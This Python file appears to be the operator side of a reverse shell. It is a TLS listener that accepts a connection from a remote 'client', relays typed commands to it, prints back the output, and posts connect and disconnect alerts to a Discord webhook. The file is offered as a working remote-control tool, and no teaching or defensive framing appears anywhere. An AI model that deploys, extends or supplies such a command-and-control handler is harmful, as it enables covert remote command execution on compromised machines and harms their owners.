import socket
import ssl
import threading
import sys
import requests

HOST = "192.168.86.37"
PORT = 13590
DISCORD_WEBHOOK_URL = "Link to webhook"

prompt = "command> "

def send_discord_notification(message: str):
    try:
        data = {"content": message}
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"[-] Discord webhook error: {e}")

def read_client_output(conn_file):
    try:
        while True:
            line = conn_file.readline()
            if not line:
                print("\n[-] Client disconnected", flush=True)
                send_discord_notification(f"❌ Client disconnected")
                break
            line = line.rstrip("\n")
            if line == "__END__":
                continue
            sys.stdout.write("\r" + " " * (len(prompt) + 80) + "\r")  # clear line
            print(f"[CLIENT] {line}", flush=True)
            sys.stdout.write(prompt)
            sys.stdout.flush()
    except Exception:
        pass

def handler():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("server.crt", "server.key")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")

    conn, addr = sock.accept()
    print(f"[+] Client connected from {addr}")
    send_discord_notification(f"✅ Client connected from {addr}")

    try:
        secure_conn = context.wrap_socket(conn, server_side=True)
    except ssl.SSLError:
        conn.close()
        return

    conn_file = secure_conn.makefile("r")
    threading.Thread(target=read_client_output, args=(conn_file,), daemon=True).start()

    try:
        while True:
            sys.stdout.write(prompt)
            sys.stdout.flush()
            cmd = sys.stdin.readline()
            if not cmd:
                continue
            cmd = cmd.strip()
            if cmd.startswith(":"):
                print("\n[*] Exiting handler.", flush=True)
                break
            if not cmd:
                continue
            secure_conn.sendall(f"{cmd}\n".encode())
    finally:
        secure_conn.close()
        print("\n[-] Client disconnected", flush=True)
        send_discord_notification(f"❌ Client disconnected from {addr}")

if __name__ == "__main__":
    handler()
